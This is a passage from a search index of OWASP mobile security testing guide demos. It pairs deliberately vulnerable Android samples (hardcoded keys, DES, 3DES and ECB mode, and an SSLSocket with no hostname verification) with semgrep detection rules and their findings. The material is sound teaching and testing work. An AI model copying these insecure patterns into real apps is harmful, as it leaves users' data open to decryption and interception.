output.txt\n</code></pre>","tags":["android","demo","MASTG-TEST-0221"]},{"location":"MASTG/demos/android/MASVS-CRYPTO/MASTG-DEMO-0022/MASTG-DEMO-0022/#observation","title":"Observation","text":"<p>The rule has identified several instances in the code file where broken encryption algorithms are used. The specified line numbers can be located in the reverse-engineered code for further investigation and remediation.</p> output.txt<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 4 Code Findings \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n    MastgTest_reversed.java\n    \u276f\u2771 rules.mastg-android-broken-encryption-algorithms\n          [MASVS-CRYPTO-1] Broken encryption algorithms found in use.\n\n           39\u2506 Cipher cipher = Cipher.getInstance(\"DES\");\n            \u22ee\u2506----------------------------------------\n           62\u2506 Cipher cipher = Cipher.getInstance(\"DESede\");\n            \u22ee\u2506----------------------------------------\n           81\u2506 Cipher cipher = Cipher.getInstance(\"RC4\");\n            \u22ee\u2506----------------------------------------\n          100\u2506 Cipher cipher = Cipher.getInstance(\"Blowfish\");\n</code></pre>","tags":["android","demo","MASTG-TEST-0221"]},{"location":"MASTG/demos/android/MASVS-CRYPTO/MASTG-DEMO-0022/MASTG-DEMO-0022/#evaluation","title":"Evaluation","text":"<p>The test fails due to the use of broken encryption algorithms, specifically DES, 3DES, RC4 and Blowfish.</p> <p>See  Broken Symmetric Encryption Algorithms for more information.</p>","tags":["android","demo","MASTG-TEST-0221"]},{"location":"MASTG/demos/android/MASVS-CRYPTO/MASTG-DEMO-0023/MASTG-DEMO-0023/","title":"MASTG-DEMO-0023: Uses of Broken Encryption Modes in Cipher with semgrep","text":"<p>  Download MASTG-DEMO-0023 APK   Open MASTG-DEMO-0023 Folder  Build MASTG-DEMO-0023 APK</p>","tags":["android","demo","MASTG-TEST-0232"]},{"location":"MASTG/demos/android/MASVS-CRYPTO/MASTG-DEMO-0023/MASTG-DEMO-0023/#sample","title":"Sample","text":"<p>The code snippet below shows sample code contains use of broken encryption modes.</p> MastgTest.ktMastgTest_reversed.java <pre><code>package org.owasp.mastestapp\n\nimport android.content.Context\nimport java.security.Key\nimport javax.crypto.Cipher\nimport javax.crypto.SecretKeyFactory\nimport javax.crypto.spec.DESKeySpec\nimport javax.crypto.spec.DESedeKeySpec\nimport javax.crypto.spec.SecretKeySpec\nimport android.util.Base64\n\nclass MastgTest(private val context: Context) {\n\n    // Vulnerable AES encryption\n    fun vulnerableAesEncryption(data: String): String {\n        try {\n            val key = \"1234567890123456\".toByteArray() // 16 bytes key for AES\n            val secretKeySpec = SecretKeySpec(key, \"AES\")\n\n            // Default mode for AES (ECB)\n            val cipher = Cipher.getInstance(\"AES\")\n            cipher.init(Cipher.ENCRYPT_MODE, secretKeySpec)\n\n            val encryptedData = cipher.doFinal(data.toByteArray())\n            return Base64.encodeToString(encryptedData, Base64.DEFAULT)\n        } catch (e: Exception) {\n            return \"Encryption error: ${e.message}\"\n        }\n    }\n\n    // Vulnerable AES with ECB and NoPadding (manual padding applied)\n    fun vulnerableAesEcbNoPadding(data: String): String {\n        try {\n            val key = \"1234567890123456\".toByteArray()\n            val secretKeySpec = SecretKeySpec(key, \"AES\")\n\n            val cipher = Cipher.getInstance(\"AES/ECB/NoPadding\")\n            cipher.init(Cipher.ENCRYPT_MODE, secretKeySpec)\n\n            // Ensure the data is padded to match the block size\n            val blockSize = 16\n            val paddingLength = blockSize - (data.length % blockSize)\n            val paddedData = data + \"\\u0000\".repeat(paddingLength) // Null padding\n\n            val encryptedData = cipher.doFinal(paddedData.toByteArray())\n            return Base64.encodeToString(encryptedData, Base64.DEFAULT).trim()\n        } catch (e: Exception) {\n            return \"Encryption error: ${e.message}\"\n        }\n    }\n\n    // Vulnerable AES with ECB and PKCS5Padding\n    fun vulnerableAesEcbPkcs5Padding(data: String): String {\n        try {\n            val key = \"1234567890123456\".toByteArray()\n            val secretKeySpec = SecretKeySpec(key, \"AES\")\n\n            val cipher = Cipher.getInstance(\"AES/ECB/PKCS5Padding\")\n            cipher.init(Cipher.ENCRYPT_MODE, secretKeySpec)\n\n            val encryptedData = cipher.doFinal(data.toByteArray())\n            return Base64.encodeToString(encryptedData, Base64.DEFAULT)\n        } catch (e: Exception) {\n            return \"Encryption error: ${e.message}\"\n        }\n    }\n\n    // Vulnerable AES with ECB and ISO10126Padding\n    fun vulnerableAesEcbIso10126Padding(data: String): String {\n        try {\n            val key = \"1234567890123456\".toByteArray()\n            val secretKeySpec = SecretKeySpec(key, \"AES\")\n\n            val cipher = Cipher.getInstance(\"AES/ECB/ISO10126Padding\")\n            cipher.init(Cipher.ENCRYPT_MODE, secretKeySpec)\n\n            val encryptedData = cipher.doFinal(data.toByteArray())\n            return Base64.encodeToString(encryptedData, Base64.DEFAULT)\n        } catch (e: Exception) {\n            return \"Encryption error: ${e.message}\"\n        }\n    }\n\n    // Vulnerable DES with ECB and PKCS5Padding\n    fun vulnerableDesEcbPkcs5Padding(data: String): String {\n        try {\n            val keySpec = DESKeySpec(\"12345678\".toByteArray())\n            val keyFactory = SecretKeyFactory.getInstance(\"DES\")\n            val secretKey: Key = keyFactory.generateSecret(keySpec)\n\n            val cipher = Cipher.getInstance(\"DES/ECB/PKCS5Padding\")\n            cipher.init(Cipher.ENCRYPT_MODE, secretKey)\n\n            val encryptedData = cipher.doFinal(data.toByteArray())\n            return Base64.encodeToString(encryptedData, Base64.DEFAULT)\n        } catch (e: Exception) {\n            return \"Encryption error: ${e.message}\"\n        }\n    }\n\n    // Vulnerable 3DES with ECB and PKCS5Padding\n    fun vulnerable3DesEcbPkcs5Padding(data: String): String {\n        try {\n            val keySpec = DESedeKeySpec(\"123456789012345678901234\".toByteArray())\n            val keyFactory = SecretKeyFactory.getInstance(\"DESede\")\n            val secretKey: Key = keyFactory.generateSecret(keySpec)\n\n            val cipher = Cipher.getInstance(\"DESede/ECB/PKCS5Padding\")\n            cipher.init(Cipher.ENCRYPT_MODE, secretKey)\n\n            val encryptedData = cipher.doFinal(data.toByteArray())\n            return Base64.encodeToString(encryptedData, Base64.DEFAULT)\n        } catch (e: Exception) {\n            return \"Encryption error: ${e.message}\"\n        }\n    }\n\n    // Test and return results\n    fun mastgTest(): String {\n        val sensitiveString = \"Hello from OWASP MASTG!\"\n\n        val results = listOf(\n            \"AES Default: ${vulnerableAesEncryption(sensitiveString)}\",\n            \"AES ECB NoPadding: ${vulnerableAesEcbNoPadding(sensitiveString)}\",\n            \"AES ECB PKCS5Padding: ${vulnerableAesEcbPkcs5Padding(sensitiveString)}\",\n            \"AES ECB ISO10126Padding: ${vulnerableAesEcbIso10126Padding(sensitiveString)}\",\n            \"DES ECB PKCS5Padding: ${vulnerableDesEcbPkcs5Padding(sensitiveString)}\",\n            \"3DES ECB PKCS5Padding: ${vulnerable3DesEcbPkcs5Padding(sensitiveString)}\"\n        )\n\n        return results.joinToString(\"\\n\")\n    }\n}\n</code></pre> <pre><code>package org.owasp.mastestapp;\n\nimport android.content.Context;\nimport android.util.Base64;\nimport java.security.Key;\nimport java.util.List;\nimport javax.crypto.Cipher;\nimport javax.crypto.SecretKeyFactory;\nimport javax.crypto.spec.DESKeySpec;\nimport javax.crypto.spec.DESedeKeySpec;\nimport javax.crypto.spec.SecretKeySpec;\nimport kotlin.Metadata;\nimport kotlin.collections.CollectionsKt;\nimport kotlin.jvm.internal.Intrinsics;\nimport kotlin.text.Charsets;\nimport kotlin.text.StringsKt;\n\n/* compiled from: MastgTest.kt */\n@Metadata(d1 = {\"\\u0000\\u001a\\n\\u0002\\u0018\\u0002\\n\\u0002\\u0010\\u0000\\n\\u0000\\n\\u0002\\u0018\\u0002\\n\\u0002\\b\\u0002\\n\\u0002\\u0010\\u000e\\n\\u0002\\b\\b\\b\\u0007\\u0018\\u00002\\u00020\\u0001B\\r\\u0012\\u0006\\u0010\\u0002\\u001a\\u00020\\u0003\u00a2\\u0006\\u0002\\u0010\\u0004J\\u0006\\u0010\\u0005\\u001a\\u00020\\u0006J\\u000e\\u0010\\u0007\\u001a\\u00020\\u00062\\u0006\\u0010\\b\\u001a\\u00020\\u0006J\\u000e\\u0010\\t\\u001a\\u00020\\u00062\\u0006\\u0010\\b\\u001a\\u00020\\u0006J\\u000e\\u0010\\n\\u001a\\u00020\\u00062\\u0006\\u0010\\b\\u001a\\u00020\\u0006J\\u000e\\u0010\\u000b\\u001a\\u00020\\u00062\\u0006\\u0010\\b\\u001a\\u00020\\u0006J\\u000e\\u0010\\f\\u001a\\u00020\\u00062\\u0006\\u0010\\b\\u001a\\u00020\\u0006J\\u000e\\u0010\\r\\u001a\\u00020\\u00062\\u0006\\u0010\\b\\u001a\\u00020\\u0006R\\u000e\\u0010\\u0002\\u001a\\u00020\\u0003X\\u0082\\u0004\u00a2\\u0006\\u0002\\n\\u0000\u00a8\\u0006\\u000e\"}, d2 = {\"Lorg/owasp/mastestapp/MastgTest;\", \"\", \"context\", \"Landroid/content/Context;\", \"(Landroid/content/Context;)V\", \"mastgTest\", \"\", \"vulnerable3DesEcbPkcs5Padding\", \"data\", \"vulnerableAesEcbIso10126Padding\", \"vulnerableAesEcbNoPadding\", \"vulnerableAesEcbPkcs5Padding\", \"vulnerableAesEncryption\", \"vulnerableDesEcbPkcs5Padding\", \"app_debug\"}, k = 1, mv = {1, 9, 0}, xi = 48)\n/* loaded from: classes4.dex */\npublic final class MastgTest {\n    public static final int $stable = 8;\n    private final Context context;\n\n    public MastgTest(Context context) {\n        Intrinsics.checkNotNullParameter(context, \"context\");\n        this.context = context;\n    }\n\n    public final String vulnerableAesEncryption(String data) {\n        Intrinsics.checkNotNullParameter(data, \"data\");\n        try {\n            byte[] key = \"1234567890123456\".getBytes(Charsets.UTF_8);\n            Intrinsics.checkNotNullExpressionValue(key, \"this as java.lang.String).getBytes(charset)\");\n            SecretKeySpec secretKeySpec = new SecretKeySpec(key, \"AES\");\n            Cipher cipher = Cipher.getInstance(\"AES\");\n            cipher.init(1, secretKeySpec);\n            byte[] bytes = data.getBytes(Charsets.UTF_8);\n            Intrinsics.checkNotNullExpressionValue(bytes, \"this as java.lang.String).getBytes(charset)\");\n            byte[] encryptedData = cipher.doFinal(bytes);\n            String encodeToString = Base64.encodeToString(encryptedData, 0);\n            Intrinsics.checkNotNullExpressionValue(encodeToString, \"encodeToString(...)\");\n            return encodeToString;\n        } catch (Exception e) {\n            return \"Encryption error: \" + e.getMessage();\n        }\n    }\n\n    public final String vulnerableAesEcbNoPadding(String data) {\n        Intrinsics.checkNotNullParameter(data, \"data\");\n        try {\n            byte[] key = \"1234567890123456\".getBytes(Charsets.UTF_8);\n            Intrinsics.checkNotNullExpressionValue(key, \"this as java.lang.String).getBytes(charset)\");\n            SecretKeySpec secretKeySpec = new SecretKeySpec(key, \"AES\");\n            Cipher cipher = Cipher.getInstance(\"AES/ECB/NoPadding\");\n            cipher.init(1, secretKeySpec);\n            int paddingLength = 16 - (data.length() % 16);\n            String paddedData = data + StringsKt.repeat(\"\\u0000\", paddingLength);\n            byte[] bytes = paddedData.getBytes(Charsets.UTF_8);\n            Intrinsics.checkNotNullExpressionValue(bytes, \"this as java.lang.String).getBytes(charset)\");\n            byte[] encryptedData = cipher.doFinal(bytes);\n            String encodeToString = Base64.encodeToString(encryptedData, 0);\n            Intrinsics.checkNotNullExpressionValue(encodeToString, \"encodeToString(...)\");\n            return StringsKt.trim((CharSequence) encodeToString).toString();\n        } catch (Exception e) {\n            return \"Encryption error: \" + e.getMessage();\n        }\n    }\n\n    public final String vulnerableAesEcbPkcs5Padding(String data) {\n        Intrinsics.checkNotNullParameter(data, \"data\");\n        try {\n            byte[] key = \"1234567890123456\".getBytes(Charsets.UTF_8);\n            Intrinsics.checkNotNullExpressionValue(key, \"this as java.lang.String).getBytes(charset)\");\n            SecretKeySpec secretKeySpec = new SecretKeySpec(key, \"AES\");\n            Cipher cipher = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n            cipher.init(1, secretKeySpec);\n            byte[] bytes = data.getBytes(Charsets.UTF_8);\n            Intrinsics.checkNotNullExpressionValue(bytes, \"this as java.lang.String).getBytes(charset)\");\n            byte[] encryptedData = cipher.doFinal(bytes);\n            String encodeToString = Base64.encodeToString(encryptedData, 0);\n            Intrinsics.checkNotNullExpressionValue(encodeToString, \"encodeToString(...)\");\n            return encodeToString;\n        } catch (Exception e) {\n            return \"Encryption error: \" + e.getMessage();\n        }\n    }\n\n    public final String vulnerableAesEcbIso10126Padding(String data) {\n        Intrinsics.checkNotNullParameter(data, \"data\");\n        try {\n            byte[] key = \"1234567890123456\".getBytes(Charsets.UTF_8);\n            Intrinsics.checkNotNullExpressionValue(key, \"this as java.lang.String).getBytes(charset)\");\n            SecretKeySpec secretKeySpec = new SecretKeySpec(key, \"AES\");\n            Cipher cipher = Cipher.getInstance(\"AES/ECB/ISO10126Padding\");\n            cipher.init(1, secretKeySpec);\n            byte[] bytes = data.getBytes(Charsets.UTF_8);\n            Intrinsics.checkNotNullExpressionValue(bytes, \"this as java.lang.String).getBytes(charset)\");\n            byte[] encryptedData = cipher.doFinal(bytes);\n            String encodeToString = Base64.encodeToString(encryptedData, 0);\n            Intrinsics.checkNotNullExpressionValue(encodeToString, \"encodeToString(...)\");\n            return encodeToString;\n        } catch (Exception e) {\n            return \"Encryption error: \" + e.getMessage();\n        }\n    }\n\n    public final String vulnerableDesEcbPkcs5Padding(String data) {\n        Intrinsics.checkNotNullParameter(data, \"data\");\n        try {\n            byte[] bytes = \"12345678\".getBytes(Charsets.UTF_8);\n            Intrinsics.checkNotNullExpressionValue(bytes, \"this as java.lang.String).getBytes(charset)\");\n            DESKeySpec keySpec = new DESKeySpec(bytes);\n            SecretKeyFactory keyFactory = SecretKeyFactory.getInstance(\"DES\");\n            Key generateSecret = keyFactory.generateSecret(keySpec);\n            Intrinsics.checkNotNullExpressionValue(generateSecret, \"generateSecret(...)\");\n            Key secretKey = generateSecret;\n            Cipher cipher = Cipher.getInstance(\"DES/ECB/PKCS5Padding\");\n            cipher.init(1, secretKey);\n            byte[] bytes2 = data.getBytes(Charsets.UTF_8);\n            Intrinsics.checkNotNullExpressionValue(bytes2, \"this as java.lang.String).getBytes(charset)\");\n            byte[] encryptedData = cipher.doFinal(bytes2);\n            String encodeToString = Base64.encodeToString(encryptedData, 0);\n            Intrinsics.checkNotNullExpressionValue(encodeToString, \"encodeToString(...)\");\n            return encodeToString;\n        } catch (Exception e) {\n            return \"Encryption error: \" + e.getMessage();\n        }\n    }\n\n    public final String vulnerable3DesEcbPkcs5Padding(String data) {\n        Intrinsics.checkNotNullParameter(data, \"data\");\n        try {\n            byte[] bytes = \"123456789012345678901234\".getBytes(Charsets.UTF_8);\n            Intrinsics.checkNotNullExpressionValue(bytes, \"this as java.lang.String).getBytes(charset)\");\n            DESedeKeySpec keySpec = new DESedeKeySpec(bytes);\n            SecretKeyFactory keyFactory = SecretKeyFactory.getInstance(\"DESede\");\n            Key generateSecret = keyFactory.generateSecret(keySpec);\n            Intrinsics.checkNotNullExpressionValue(generateSecret, \"generateSecret(...)\");\n            Key secretKey = generateSecret;\n            Cipher cipher = Cipher.getInstance(\"DESede/ECB/PKCS5Padding\");\n            cipher.init(1, secretKey);\n            byte[] bytes2 = data.getBytes(Charsets.UTF_8);\n            Intrinsics.checkNotNullExpressionValue(bytes2, \"this as java.lang.String).getBytes(charset)\");\n            byte[] encryptedData = cipher.doFinal(bytes2);\n            String encodeToString = Base64.encodeToString(encryptedData, 0);\n            Intrinsics.checkNotNullExpressionValue(encodeToString, \"encodeToString(...)\");\n            return encodeToString;\n        } catch (Exception e) {\n            return \"Encryption error: \" + e.getMessage();\n        }\n    }\n\n    public final String mastgTest() {\n        List results = CollectionsKt.listOf((Object[]) new String[]{\"AES Default: \" + vulnerableAesEncryption(\"Hello from OWASP MASTG!\"), \"AES ECB NoPadding: \" + vulnerableAesEcbNoPadding(\"Hello from OWASP MASTG!\"), \"AES ECB PKCS5Padding: \" + vulnerableAesEcbPkcs5Padding(\"Hello from OWASP MASTG!\"), \"AES ECB ISO10126Padding: \" + vulnerableAesEcbIso10126Padding(\"Hello from OWASP MASTG!\"), \"DES ECB PKCS5Padding: \" + vulnerableDesEcbPkcs5Padding(\"Hello from OWASP MASTG!\"), \"3DES ECB PKCS5Padding: \" + vulnerable3DesEcbPkcs5Padding(\"Hello from OWASP MASTG!\")});\n        return CollectionsKt.joinToString$default(results, \"\\n\", null, null, 0, null, null, 62, null);\n    }\n}\n</code></pre>","tags":["android","demo","MASTG-TEST-0232"]},{"location":"MASTG/demos/android/MASVS-CRYPTO/MASTG-DEMO-0023/MASTG-DEMO-0023/#steps","title":"Steps","text":"<p>Let's run our  semgrep rule against the sample code.</p> ../../../../rules/mastg-android-broken-encryption-modes.yaml<pre><code>rules:\n  - id: mastg-android-broken-encryption-modes\n    languages:\n      - java\n    severity: WARNING\n    metadata:\n      summary: This rule looks for broken encryption modes.\n    message: \"[MASVS-CRYPTO-1] Broken encryption modes found in use.\"\n    pattern-either:\n      - pattern: Cipher.getInstance(\"AES\")\n      - pattern-regex: Cipher\\.getInstance\\(\"?[A-Za-z0-9]+/ECB(/[A-Za-z0-9]+)?\"?\\)\n</code></pre> run.sh<pre><code>NO_COLOR=true semgrep -c ../../../../rules/mastg-android-broken-encryption-modes.yaml ./MastgTest_reversed.java --text &gt; output.txt\n</code></pre>","tags":["android","demo","MASTG-TEST-0232"]},{"location":"MASTG/demos/android/MASVS-CRYPTO/MASTG-DEMO-0023/MASTG-DEMO-0023/#observation","title":"Observation","text":"<p>The rule has identified six instances in the code file where broken encryption modes are used. The specified line numbers can be located in the reverse-engineered code for further investigation and remediation.</p> output.txt<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 6 Code Findings \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n    MastgTest_reversed.java\n    \u276f\u2771 rules.mastg-android-broken-encryption-modes\n          [MASVS-CRYPTO-1] Broken encryption modes found in use.\n\n           36\u2506 Cipher cipher = Cipher.getInstance(\"AES\");\n            \u22ee\u2506----------------------------------------\n           55\u2506 Cipher cipher = Cipher.getInstance(\"AES/ECB/NoPadding\");\n            \u22ee\u2506----------------------------------------\n           76\u2506 Cipher cipher = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n            \u22ee\u2506----------------------------------------\n           95\u2506 Cipher cipher = Cipher.getInstance(\"AES/ECB/ISO10126Padding\");\n            \u22ee\u2506----------------------------------------\n          118\u2506 Cipher cipher = Cipher.getInstance(\"DES/ECB/PKCS5Padding\");\n            \u22ee\u2506----------------------------------------\n          141\u2506 Cipher cipher = Cipher.getInstance(\"DESede/ECB/PKCS5Padding\");\n</code></pre>","tags":["android","demo","MASTG-TEST-0232"]},{"location":"MASTG/demos/android/MASVS-CRYPTO/MASTG-DEMO-0023/MASTG-DEMO-0023/#evaluation","title":"Evaluation","text":"<p>The test fails since the output contains several instances of the ECB mode of AES in different transformations explicitly or implicitly (ECB is the default mode for AES if not specified).</p> <p>See  Broken Symmetric Encryption Modes for more information.</p>","tags":["android","demo","MASTG-TEST-0232"]},{"location":"MASTG/demos/android/MASVS-NETWORK/MASTG-DEMO-0048/MASTG-DEMO-0048/","title":"MASTG-DEMO-0048: SSLSocket Connection to Wrong Host Server Allowed by Lack of HostnameVerifier","text":"<p>  Download MASTG-DEMO-0048 APK   Open MASTG-DEMO-0048 Folder  Build MASTG-DEMO-0048 APK</p>","tags":["android","demo","MASTG-TEST-0234"]},{"location":"MASTG/demos/android/MASVS-NETWORK/MASTG-DEMO-0048/MASTG-DEMO-0048/#overview","title":"Overview","text":"<p>The following sample code demonstrates how to connect to a  badssl server that delivers a certificate with a wrong or invalid hostname using <code>SSLSocket</code>, which inherently doesn't perform any hostname validation checks.</p> <p>Note: The connection succeeds even if the app has a fully secure Network Security Configuration (NSC) in place because <code>SSLSocket</code> is not affected by it.</p> MastgTest.ktMastgTest_reversed.java <pre><code>package org.owasp.mastestapp\n\nimport android.content.Context\nimport java.io.BufferedReader\nimport java.io.InputStreamReader\nimport javax.net.ssl.SSLSocket\nimport javax.net.ssl.SSLSocketFactory\n\nclass MastgTest(private val context: Context) {\n\n    fun mastgTest(): String {\n        var socket: SSLSocket? = null\n\n        return try {\n            // Use the default SSLSocketFactory\n            val sslSocketFactory = SSLSocketFactory.getDefault() as SSLSocketFactory\n\n            // Connect to the server using SSLSocket\n            val host = \"wrong.host.badssl.com\"\n            val port = 443\n            socket = sslSocketFactory.createSocket(host, port) as SSLSocket\n\n            // Start the handshake\n            socket.startHandshake()\n\n            // Send an HTTP GET request\n            val request = \"GET / HTTP/1.1\\r\\nHost: $host\\r\\nConnection: close\\r\\n\\r\\n\"\n            val out = socket.outputStream\n            out.write(request.toByteArray())\n            out.flush()\n\n            // Read the response (this will read until the server closes)\n            val reader = BufferedReader(InputStreamReader(socket.inputStream))\n            val response = reader.readText()\n\n            \"Connection Successful: ${response.substring(0, minOf(200, response.length))}\"\n        } catch (e: Exception) {\n            e.printStackTrace()\n            \"Connection Failed: ${e::class.simpleName} - ${e.message}\"\n        } finally {\n            // Clean up: close the socket\n            socket?.let {\n                try { it.close() } catch (_: Exception) {}\n            }\n        }\n    }\n}\n</code></pre> <pre><code>package org.owasp.mastestapp;\n\nimport android.content.Context;\nimport androidx.compose.runtime.ComposerKt;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.Socket;\nimport javax.net.SocketFactory;\nimport javax.net.ssl.SSLSocket;\nimport javax.net.ssl.SSLSocketFactory;\nimport kotlin.Metadata;\nimport kotlin.io.TextStreamsKt;\nimport kotlin.jvm.internal.Intrinsics;\nimport kotlin.jvm.internal.Reflection;\nimport kotlin.text.Charsets;\n\n/* compiled from: MastgTest.kt */\n@Metadata(d1 = {\"\\u0000\\u0018\\n\\u0002\\u0018\\u0002\\n\\u0002\\u0010\\u0000\\n\\u0000\\n\\u0002\\u0018\\u0002\\n\\u0002\\b\\u0002\\n\\u0002\\u0010\\u000e\\n\\u0000\\b\\u0007\\u0018\\u00002\\u00020\\u0001B\\r\\u0012\\u0006\\u0010\\u0002\\u001a\\u00020\\u0003\u00a2\\u0006\\u0002\\u0010\\u0004J\\u0006\\u0010\\u0005\\u001a\\u00020\\u0006R\\u000e\\u0010\\u0002\\u001a\\u00020\\u0003X\\u0082\\u0004\u00a2\\u0006\\u0002\\n\\u0000\u00a8\\u0006\\u0007\"}, d2 = {\"Lorg/owasp/mastestapp/MastgTest;\", \"\", \"context\", \"Landroid/content/Context;\", \"(Landroid/content/Context;)V\", \"mastgTest\", \"\", \"app_debug\"}, k = 1, mv = {1, 9, 0}, xi = 48)\n/* loaded from: classes4.dex */\npublic final class MastgTest {\n    public static final int $stable = 8;\n    private final Context context;\n\n    public MastgTest(Context context) {\n        Intrinsics.checkNotNullParameter(context, \"context\");\n        this.context = context;\n    }\n\n    public final String mastgTest() {\n        String str;\n        SSLSocket socket = null;\n        try {\n            try {\n                SocketFactory socketFactory = SSLSocketFactory.getDefault();\n                Intrinsics.checkNotNull(socketFactory, \"null cannot be cast to non-null type javax.net.ssl.SSLSocketFactory\");\n                SSLSocketFactory sslSocketFactory = (SSLSocketFactory) socketFactory;\n                Socket createSocket = sslSocketFactory.createSocket(\"wrong.host.badssl.com\", 443);\n                Intrinsics.checkNotNull(createSocket, \"null cannot be cast to non-null type javax.net.ssl.SSLSocket\");\n                socket = (SSLSocket) createSocket;\n                socket.startHandshake();\n                String request = \"GET / HTTP/1.1\\r\\nHost: wrong.host.badssl.com\\r\\nConnection: close\\r\\n\\r\\n\";\n                OutputStream out = socket.getOutputStream();\n                byte[] bytes = request.getBytes(Charsets.UTF_8);\n                Intrinsics.checkNotNullExpressionValue(bytes, \"this as java.lang.String).getBytes(charset)\");\n                out.write(bytes);\n                out.flush();\n                BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n                String response = TextStreamsKt.readText(reader);\n                StringBuilder append = new StringBuilder().append(\"Connection Successful: \");\n                String substring = response.substring(0, Math.min(ComposerKt.invocationKey, response.length()));\n                Intrinsics.checkNotNullExpressionValue(substring, \"this as java.lang.String\u2026ing(startIndex, endIndex)\");\n                str = append.append(substring).toString();\n                try {\n                    socket.close();\n                } catch (Exception e) {\n                }\n            } catch (Exception e2) {\n                e2.printStackTrace();\n                str = \"Connection Failed: \" + Reflection.getOrCreateKotlinClass(e2.getClass()).getSimpleName() + \" - \" + e2.getMessage();\n                if (socket != null) {\n                    SSLSocket it = socket;\n                    try {\n                        it.close();\n                    } catch (Exception e3) {\n                    }\n                }\n            }\n            return str;\n        } catch (Throwable th) {\n            if (socket != null) {\n                SSLSocket it2 = socket;\n                try {\n                    it2.close();\n                } catch (Exception e4) {\n                }\n            }\n            throw th;\n        }\n    }\n}\n</code></pre>","tags":["android","demo","MASTG-TEST-0234"]},{"location":"MASTG/demos/android/MASVS-NETWORK/MASTG-DEMO-0048/MASTG-DEMO-0048/#steps","title":"Steps","text":"<ol> <li>Reverse engineer the app ( Decompiling Java Code).</li> <li>Run a static analysis ( Static Analysis on Android) tool and look for all usages of <code>SSLSocket</code> and <code>HostnameVerifier</code>.</li> </ol> ../../../../rules/mastg-android-ssl-socket-hostnameverifier.yml<pre><code>rules:\n  - id: mastg-android-ssl-socket-hostnameverifier\n    severity: WARNING\n    languages:\n      - java\n    metadata:\n      summary: This rules scans for the usage of SSLSocket API with a HostnameVerifier.\n    message: \"Detected usage of SSLSocket API with or without a HostnameVerifier\"\n    match:\n      any:\n        - pattern: SSLSocketFactory.getDefault()\n        - pattern: (SSLSocketFactory) $_\n        - pattern: $SF.createSocket(...)\n        - pattern: HttpsURLConnection.getDefaultHostnameVerifier()\n        - pattern: $HNV.verify($_, $_)\n</code></pre> run.sh<pre><code>NO_COLOR=true semgrep -c ../../../../rules/mastg-android-ssl-socket-hostnameverifier.yml ./MastgTest_reversed.java &gt; output.txt\n</code></pre>","tags":["android","demo","MASTG-TEST-0234"]},{"location":"MASTG/demos/android/MASVS-NETWORK/MASTG-DEMO-0048/MASTG-DEMO-0048/#observation","title":"Observation","text":"<p>The output contains a list of locations where <code>SSLSocket</code> and <code>HostnameVerifier</code> are used.</p> output.txt<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 3 Code Findings \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n    MastgTest_reversed.java\n     \u2771 rules.mastg-android-ssl-socket-hostnameverifier\n           35\u2506 SocketFactory socketFactory = SSLSocketFactory.getDefault();\n            \u22ee\u2506----------------------------------------\n           37\u2506 SSLSocketFactory sslSocketFactory = (SSLSocketFactory) socketFactory;\n            \u22ee\u2506----------------------------------------\n           38\u2506 Socket createSocket = sslSocketFactory.createSocket(\"wrong.host.badssl.com\", 443);\n</code></pre>","tags":["android","demo","MASTG-TEST-0234"]},{"location":"MASTG/demos/android/MASVS-NETWORK/MASTG-DEMO-0048/MASTG-DEMO-0048/#evaluation","title":"Evaluation","text":"<p>The test case fails due to the missing <code>HostnameVerifier</code>.</p> <p>Note: If the app were to use a <code>HostnameVerifier</code>, the connection would abort with an exception like the following, which can be read in the logcat output:</p> <pre><code>javax.net.ssl.SSLException: Hostname verification failed for host: wrong.host.badssl.com\n</code></pre>","tags":["android","demo","MASTG-TEST-0234"]},{"location":"MASTG/demos/android/MASVS-NETWORK/MASTG-DEMO-0049/MASTG-DEMO-0049/","title":"MASTG-DEMO-0049: SSLSocket Connection to Wrong Host Server Blocked by HostnameVerifier","text":"<p>  Download MASTG-DEMO-0049 APK   Open MASTG-DEMO-0049 Folder  Build MASTG-DEMO-0049 APK</p>","tags":["android","demo","MASTG-TEST-0234"]},{"location":"MASTG/demos/android/MASVS-NETWORK/MASTG-DEMO-0049/MASTG-DEMO-0049/#overview","title":"Overview","text":"<p>The following sample code demonstrates how to connect to a  badssl server that delivers a certificate with a wrong or invalid hostname using <code>SSLSocket</code> which inherently doesn't perform any hostname validation checks.</p> <p>However, the code implements a custom <code>HostnameVerifier</code> that performs hostname verification, thus blocking the connection to the server with the wrong hostname.</p> MastgTest.ktMastgTest_reversed.java <pre><code>package org.owasp.mastestapp\n\nimport android.content.Context\nimport java.io.BufferedReader\nimport java.io.InputStreamReader\nimport javax.net.ssl.HttpsURLConnection\nimport javax.net.ssl.SSLException\nimport javax.net.ssl.SSLSocket\nimport javax.net.ssl.SSLSocketFactory\n\nclass MastgTest(private val context: Context) {\n\n    fun mastgTest(): String {\n        var socket: SSLSocket? = null\n\n        return try {\n            // Use the default SSLSocketFactory\n            val sslSocketFactory = SSLSocketFactory.getDefault() as SSLSocketFactory\n\n            // Connect to the server using SSLSocket\n            val host = \"wrong.host.badssl.com\"\n            val port = 443\n            socket = sslSocketFactory.createSocket(host, port) as SSLSocket\n\n            // Start the handshake\n            socket.startHandshake()\n\n            val hostnameVerifier = HttpsURLConnection.getDefaultHostnameVerifier()\n            val session = socket.session\n            if (!hostnameVerifier.verify(host, session)) {\n                throw SSLException(\"Hostname verification failed for host: $host\")\n            }\n\n            // Send an HTTP GET request\n            val request = \"GET / 